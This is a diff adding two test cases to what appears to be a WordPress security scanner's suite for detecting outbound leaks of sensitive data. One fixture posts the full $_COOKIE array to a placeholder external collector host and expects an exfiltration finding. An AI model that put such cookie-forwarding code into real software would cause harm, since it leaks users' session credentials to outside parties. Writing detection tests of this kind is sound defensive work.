@@ -50,6 +50,28 @@ CODE,
 		'expect' => 'dataflow_sensitive_http_exfil',
 	],
 	[
+		'name' => 'sensitive cookies sent to a proven local WordPress admin URL are not external exfiltration',
+		'code' => <<<'CODE'
+<?php
+$args = [
+	'body' => 'test',
+	'cookies' => $_COOKIE,
+];
+$url = add_query_arg( [ 'action' => 'background_check' ], admin_url( 'admin-ajax.php' ) );
+wp_remote_post( $url, $args );
+CODE,
+		'expect_none' => true,
+	],
+	[
+		'name' => 'sensitive cookies sent to an external URL remain reportable',
+		'code' => <<<'CODE'
+<?php
+$url = add_query_arg( [ 'action' => 'background_check' ], 'https://collector.example.invalid/' );
+wp_remote_post( $url, [ 'cookies' => $_COOKIE ] );
+CODE,
+		'expect' => 'dataflow_sensitive_http_exfil',
+	],
+	[
 		'name' => 'authorization header reaches outbound HTTP',
 		'code' => <<<'CODE'
 <?php
